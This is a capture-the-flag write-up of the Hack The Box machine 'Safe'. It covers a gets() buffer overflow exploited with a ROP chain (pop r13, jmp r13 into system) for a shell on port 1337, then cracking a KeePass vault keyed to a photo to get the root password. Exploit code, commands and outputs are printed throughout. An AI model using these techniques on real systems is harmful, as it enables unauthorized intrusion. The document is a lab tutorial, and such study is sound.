---
layout: post
title: "The Vault With a Sticky Note Inside"
subtitle: "HTB Safe, where a single sloppy read() hands you a shell, and a password manager guarded by a vacation photo hands you root"
date: 2019-11-02 12:00:00 +0000
description: "A custom binary that trusts your input too far gives a shell, and a KeePass vault keyed to a single vacation photo gives root."
image: /assets/og/the-vault-with-a-sticky-note-inside.png
tags: [hackthebox, writeup]
---

Safe is a box named after the thing it pretends to be and isn't. There are two locks here, and both were defeated before you ever showed up. The first is a little C program listening on a strange port that asks for your input and then reads far more of it than it has room for, the oldest mistake a compiled program can make. You hand it a careful pile of bytes and it ends up running the part of itself it was never meant to run. The second lock is a real password manager, a KeePass vault, and on paper that is good security. Except the owner protected it with one of their own holiday snapshots as the key file and left all six candidate photos sitting right next to the vault. A safe is only as good as where you hide the combination, and on this box the combination is taped to the door.

```
        S A F E
        =======
        :1337   "say something"
                you say 128 bytes into a 120-byte room
                     |
                     v
        the program trips over your sentence and
        runs a line it left lying around: jmp r13
                     |
                     v
        a vault upstairs. six photos beside it.
        one of them is the key. it always was.
                                            金
```

## 0x01 · the door at 1337

`nmap -sC -sV` is short and a little strange. SSH and a web server you expect. The third port is the tell.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian
80/tcp   open  http    Apache httpd 2.4.25
1337/tcp open  waste?  ?
```

Port 1337 is not a real service nmap recognizes. Connect to it and it prints the output of `uptime`, then waits for you to type. That is a program someone wrote by hand, and a hand-written network service that takes your input is the most promising sentence in security. The web server is almost bare, but its source carries a quiet comment pointing at `/myapp`. So you pull the binary down and look at it on your own bench.

```
$ wget http://10.10.10.147/myapp
$ file myapp
myapp: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Not stripped means the function names are still attached, which is the box being generous. You can read this thing like a book.

## 0x02 · the room that was too small

Open `myapp` in any disassembler and the heart of it is three instructions of trouble. It prints the uptime, then calls `gets()` on a buffer that lives on the stack. `gets()` is the function every C textbook tells you to never use, because it reads a line from the user with no idea how long the line is and no way to stop. The buffer has room for a polite amount of text. `gets()` will happily accept a novel.

Think of it like a bouncer with a clipboard who writes down your name in a box on the form, except the box only fits twelve letters and the bouncer keeps writing no matter how long your name is, straight off the edge of the paper and onto the desk, the wall, the floor. The form has other important fields printed below that box. One of those fields, further down the page, is the instruction the program reads when it finishes: "now go back to here and continue." That instruction is the return address. Write a name long enough and you are no longer filling in your name. You are rewriting where the program goes next.

A few cycles in a debugger nails the geometry. It takes exactly 120 bytes of your input to walk off the end of the buffer and reach the bytes that hold the return address. Byte 121 onward is the steering wheel.

```
$ gdb ./myapp
# send a cyclic pattern, see what lands in RIP, find the offset
offset to RIP control: 120
```

The protections are modern. The stack is non-executable, so you cannot simply write your own code into that overflowed buffer and run it. ASLR shuffles the library addresses on every run. Both of those defenses assume the attacker has to bring their own code, or has to know where the good code lives. Safe quietly violates both assumptions, because the useful code is already in the binary and sits at a fixed address.

## 0x03 · the line it left lying around

Here is the gift. The binary contains a function named `test()` that is never called by anything during normal operation. Dead code, left in by the author. And inside `test()` is one instruction that changes everything.

```
0x401159 <test+7>:   jmp r13
```

`jmp r13` means "go to whatever address is currently sitting in the r13 register, and keep running from there." It is a steering wheel that points wherever one CPU register happens to point. If you control the return address (you do, after 120 bytes) and you can control r13, you can send the program absolutely anywhere. This is return-oriented programming in its gentlest form. Instead of injecting code, you stitch together scraps of code the program already owns. Picture a ransom note built from magazine cutouts. You are not writing new letters, you are scavenging the ones already printed and gluing them into a sentence the magazine never meant to say.

You need one more scrap to load r13 with a value of your choosing. A scan with `ropper` or `ROPgadget` finds a `pop r13; pop r14; pop r15; ret` sequence in the binary at a fixed address. "Pop" means "take the next value off the stack and drop it into this register," and the stack at that moment is your overflowed buffer, which you control completely.

```
$ ropper --file myapp --search "pop r13"
0x0000000000401206: pop r13; pop r14; pop r15; ret;
```

There is one more piece of luck that makes this almost too clean. Remember the program prints `uptime` by calling `system("uptime")` at startup, so `system()` is already wired into the binary and reachable at a known PLT address. `system()` is the C function that runs a shell command. So the recipe writes itself. Put `/bin/sh` into the buffer where the stack pointer will be looking. Use the pop gadget to load the address of `system()` into r13. Return into `jmp r13`, and the program calls `system()` with your buffer's contents as the command.

```
junk    = b"A" * 120
chain   = pop_r13_r14_r15      # 0x401206
        + system_plt           # r13 now holds system()
        + b"junkjunk"          # filler popped into r14, r15
        + jmp_r13_in_test      # 0x401159: go to system()
        + b"/bin/sh\x00"       # the command system() finds on the stack
```

Pipe that into port 1337 and the program, instead of returning to its own polite loop, calls `system()` on a shell. The prompt that answers is `user`.

```
$ python3 exploit.py | nc 10.10.10.147 1337
id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat /home/user/user.txt
████████████████████████████████
```

No code was injected. No library address was guessed. The whole exploit is the program's own leftover instructions, read back to it in an order it never intended. ASLR never mattered because every address we used lives inside the non-randomized binary itself.

## 0x04 · the vault and the photographs

`user` is a normal account, so you go looking for the climb. In `user`'s home directory sits a real KeePass database, `MyPasswords.kdbx`, and beside it, six holiday photographs named `IMG_0545.JPG` through `IMG_0553.JPG`.

KeePass is genuinely good. It encrypts the whole vault, and this one is locked two ways at once. It needs a master password, and it needs a key file, an arbitrary file whose exact bytes act as a second secret. The idea is sound: even if someone guesses your password, they still need the file. But the owner used one of their own photos as that key file, and then stored all six photos in the same folder as the vault. The second secret is in the same drawer as the lock it protects.

You do not have to know which photo. You let the cracker try all of them. `keepass2john` reads the vault and turns it into a hash John the Ripper can chew on, and it accepts a candidate key file, so you generate one hash per photo.

```
$ keepass2john MyPasswords.kdbx > hashes
$ for img in IMG_*.JPG; do
>   keepass2john -k "$img" MyPasswords.kdbx
> done >> hashes
$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
bullshit         (MyPasswords)
```

John finds the master password, `bullshit`, and crucially it only cracks against the one hash that used the correct photo, which tells you the right key file in the same stroke. Picture a combination lock with five fake dials glued on next to the real one. Try every dial against the same code and only the real dial turns. The lock just told you which dial was real.

Now you open the vault for real with `kpcli`, the command-line KeePass client, handing it the database, the master password, and the photo that won.

```
$ kpcli --kdb MyPasswords.kdbx --key IMG_0547.JPG
Provide the master password: bullshit
kpcli:/> show -f /MyPasswords/root
Password: u3v2249dl9ptv465cogl3cnpo3fyhk
```

That is the root account's password, sitting in the vault the whole time. `su -`, paste it in, and the box is over.

```
$ su -
Password: u3v2249dl9ptv465cogl3cnpo3fyhk
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is tempting to read Safe as two unrelated tricks, a binary-exploitation warm-up bolted to a password-manager gimmick. Look closer and they are the same confession told twice. Both halves are about a secret stored right next to the thing it was supposed to protect.

The buffer overflow is that story in silicon. A return address is a secret instruction the program keeps for itself, and `gets()` lets the user's input run straight into the field that holds it. There is no wall between "the text you typed" and "the program's private notes about where to go next." They share a desk, so the long name spills onto the instruction. Modern defenses like NX and ASLR exist precisely to rebuild that wall, and they work, right up until the program ships a fixed-address `jmp r13` and a spare `system()` call as housewarming gifts. The defenses guard against code you bring. They are silent about the code already in the room.

The KeePass half is the human version, and it is the one that should sting, because nothing was unpatched. KeePass did its job perfectly. The owner did everything the tutorial said, two factors, a key file separate from the password, real encryption, and then undid all of it by keeping the key file in the same folder as the vault and choosing a password that lives near the top of rockyou. A second secret stored next to the first is not a second secret. It is decoration. You cannot crack a vault you do not have the key to, so the only winning move the owner had was to put the key somewhere the vault was not.

That is the whole lesson, and it scales far past this box. The strength of a secret is not in the algorithm guarding it. It is in the distance between the secret and the thing it locks. Close that distance and the best cryptography on earth becomes a sticky note on a very expensive door.

## 0x06 · outro

```
the program kept a private note about where to go next.
you wrote your name long enough to cross it out.

the vault was real. the lock was real. the key was a photo
        left in the same drawer, smiling at the camera.

two safes. neither one was broken into.
both were left standing open, with the combination inside.

mind the buffer. move the key. wear black.

                                                            EOF
```

---

*HTB: Safe, retired 26 Oct 2019. An easy Linux box that is really a lecture on keeping the secret away from the lock, told first in a sloppy read() and then in a vault keyed to a vacation photo. The binary still trips over a long sentence in a lab and nowhere you don't own.*